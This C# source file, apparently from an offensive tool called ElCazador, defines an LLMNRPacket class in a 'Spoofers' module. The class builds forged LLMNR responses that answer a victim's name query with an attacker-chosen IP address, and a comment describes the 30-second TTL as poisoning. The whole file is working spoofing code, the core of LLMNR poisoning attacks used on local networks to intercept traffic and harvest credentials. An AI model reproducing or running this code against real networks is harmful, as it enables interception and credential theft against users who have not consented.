using System.Linq;
using ElCazador.Worker.Models;
using ElCazador.Worker.Utils;

namespace ElCazador.Worker.Modules.Spoofers.Models
{
    public class LLMNRPacket : IPacket
    {
        public LLMNRPacket(byte[] data, byte[] ip)
        {
            var nameLen = (int)data[12];

            Tid = data.Take(2).ToArray();
            Ip = ip;
            
            AnswerName = data.Skip(13).Take(nameLen).ToArray();
            AnswerNameLen = ByteUtils.IntToShortLittleEndian(AnswerName.Length);

            QuestionName = AnswerName;
            QuestionNameLen = ByteUtils.IntToShortLittleEndian(AnswerName.Length);
        }

        public byte[] Build()
        {
            var packet = Tid
                .Concat(Flags)
                .Concat(Question)
                .Concat(AnswerRRS)
                .Concat(AuthorityRRS)
                .Concat(AdditionalRRS)
                .Concat(QuestionNameLen)
                .Concat(QuestionName)
                .Concat(QuestionNameNull)
                .Concat(Type)
                .Concat(Class)
                .Concat(AnswerNameLen)
                .Concat(AnswerName)
                .Concat(AnswerNameNull)
                .Concat(Type1)
                .Concat(Class1)
                .Concat(TTL)
                .Concat(IpLen)
                .Concat(Ip)
                .ToArray();

            return packet;
        }
        
        // 28 bytes + 2 + 4 + 1 + answerNameLen + 1 + answerNameLen
        private byte[] Tid { get; set; } = new byte[] { };
        private byte[] Flags { get; set; } = { 0x80, 0x00 };
        private byte[] Question { get; set; } = { 0x00, 0x01 };
        private byte[] AnswerRRS { get; set; } = { 0x00, 0x01 };
        private byte[] AuthorityRRS { get; set; } = { 0x00, 0x00 };
        private byte[] AdditionalRRS { get; set; } = { 0x00, 0x00 };
        private byte[] QuestionNameLen { get; set; } = { 0x09 };
        private byte[] QuestionName { get; set; } = new byte[] { };
        private byte[] QuestionNameNull { get; set; } = { 0x00 };
        private byte[] Type { get; set; } = { 0x00, 0x01 };
        private byte[] Class { get; set; } = { 0x00, 0x01 };
        private byte[] AnswerNameLen { get; set; } = { 0x09 };
        private byte[] AnswerName { get; set; } = new byte[] { };
        private byte[] AnswerNameNull { get; set; } = { 0x00 };
        private byte[] Type1 { get; set; } = { 0x00, 0x01 };
        private byte[] Class1 { get; set; } = { 0x00, 0x01 };
        private byte[] TTL { get; set; } = { 0x00, 0x00, 0x00, 0x1e }; // Poison for 30 sec
        private byte[] IpLen { get; set; } = { 0x00, 0x04 };
        private byte[] Ip { get; set; } = new byte[] { };
    }
}